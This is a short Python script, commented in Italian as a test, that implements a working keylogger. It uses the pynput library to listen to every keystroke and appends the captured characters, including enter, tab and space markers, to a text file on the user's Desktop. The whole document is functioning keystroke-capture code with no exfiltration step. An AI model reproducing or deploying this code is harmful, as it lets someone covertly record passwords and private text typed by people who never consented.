# Test del keylogger costruito in Python

import pynput
from pynput.keyboard import Key, Listener
from pathlib import Path

percorso = Path.home() / "Desktop" / "Scritto.txt"

alfabeto = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZè+òàù,.-é*ç°§;:_[]@#{}1234567890"

def on_press(key):
    file = percorso.open("a")
    inserimento = "{0}".format(key)
##    print(inserimento)
    if inserimento[1] in alfabeto:
        if "Key" not in inserimento:
          file.write(inserimento[1])
        else:
            if inserimento == "Key.enter" or inserimento == "Key.tab":
                file.write("\n" + inserimento + "\n")
            elif inserimento == "Key.space":
                file.write(" ")
            else:
                file.write(" \\ " + inserimento + " \\ ")
def on_release(key):
    return True

with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
